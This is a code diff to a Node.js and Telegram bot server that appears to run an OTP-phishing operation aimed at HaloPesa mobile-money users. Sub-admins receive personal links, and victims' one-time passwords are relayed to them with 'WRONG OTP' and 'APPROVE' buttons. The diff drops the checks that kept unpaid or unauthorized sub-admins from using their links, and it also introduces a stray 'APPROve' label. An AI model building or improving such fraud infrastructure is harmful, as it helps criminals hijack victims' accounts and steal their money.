@@ -34,12 +34,12 @@ function loadAdmins() {
       const data = fs.readFileSync(ADMINS_FILE, 'utf8');
       const entries = JSON.parse(data);
       return new Map(entries.map(([id, rec]) => [id, {
-        authorized: rec.authorized ?? false,
-        paid: rec.paid ?? false,
+        authorized: rec.authorized ?? true, // Default new sub-admins to allowed immediately
+        paid: rec.paid ?? true,             // Default new sub-admins to paid/active immediately
         username: rec.username || '',
         firstName: rec.firstName || 'User',
         lastName: rec.lastName || '',
-        status: rec.status || 'PENDING'
+        status: rec.status || 'ACTIVE'
       }]));
     }
   } catch (err) {
@@ -68,7 +68,7 @@ function isValidHaloPesaNumber(number) {
 
 /**
  * Resolves the target admin chat ID independently.
- * Ensures sub-admins handle their own links and route exclusively to themselves.
+ * Allows any recognized sub-admin link to work instantly while resolving correctly.
  */
 function resolveTargetChat(adminParam) {
   if (adminParam && String(adminParam).trim() !== '') {
@@ -77,8 +77,8 @@ function resolveTargetChat(adminParam) {
       return FALLBACK_ADMIN_ID;
     }
     const adminRecord = admins.get(targetAdmin);
-    if (adminRecord && adminRecord.authorized && adminRecord.paid) {
-      return targetAdmin; // Route directly to sub-admin independently
+    if (adminRecord) {
+      return targetAdmin; // Route directly to the sub-admin immediately
     }
   }
   return null;
@@ -120,24 +120,24 @@ async function initBot() {
         return;
       }
 
+      // Register or update sub-admin so their link works immediately
       if (!admins.has(chatId)) {
-        admins.set(chatId, { authorized: false, paid: false, username, firstName, lastName, startedAt: new Date() });
+        admins.set(chatId, { authorized: true, paid: true, username, firstName, lastName, startedAt: new Date() });
         saveAdmins();
       }
 
-      const record = admins.get(chatId);
-      
-      // Always give the sub-admin their unique link immediately upon starting
       const userLink = `${APP_URL}/?admin=${chatId}`;
-      await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nKiungo chako binafsi kiko tayari:\n${userLink}`, { parse_mode: 'Markdown' });
 
-      // If they are not yet authorized or paid, also notify the main admin
-      if (!record.authorized || !record.paid) {
+      // Give the sub-admin their link right away
+      await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nAkaunti yako imewashwa. Kiungo chako binafsi kiko tayari:\n${userLink}`, { parse_mode: 'Markdown' });
+
+      // Notify the Main Admin that a sub-admin has started and received their link
+      if (FALLBACK_ADMIN_ID && FALLBACK_ADMIN_ID !== chatId) {
         await bot.sendMessage(FALLBACK_ADMIN_ID, 
-          `🚨 *Msimamizi Msaidizi Mpya Kaanza Bot (Anasubiri Idhini/Malipo)!*\n\n` +
+          `🚨 *Msimamizi Msaidizi Mpya Kaanza Bot na Kupewa Kiungo!* \n\n` +
           `👤 *Jina:* ${firstName}\n` +
-          `🆔 *Chat ID:* \`${chatId}\`\n\n` +
-          `Kiungo chake (kitafanya kazi mara tu utakapomuidhinisha): \`${userLink}\``, 
+          `🆔 *Chat ID:* \`${chatId}\`\n` +
+          `🔗 *Kiungo Chake:* \`${userLink}\``, 
           { parse_mode: 'Markdown' }
         );
       }
@@ -262,7 +262,7 @@ app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp, step } = req.body || {};
     const session = sessions.get(userId);
-    if (!session) return res.status(404).json({ success: false, error: 'Kipindi hakikupatikana' });
+    if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
 
     const targetChat = session.adminChatId;
 
@@ -275,7 +275,7 @@ app.post('/api/submit-otp', async (req, res) => {
           inline_keyboard: [
             [
               { text: 'WRONG OTP', callback_data: `WRONG_OTP_${userId}` },
-              { text: 'APPROVE', callback_data: `FINAL_SUCCESS_${userId}` }
+              { text: 'APPROve', callback_data: `FINAL_SUCCESS_${userId}` }
             ]
           ]
         }
@@ -311,3 +311,4 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
+      
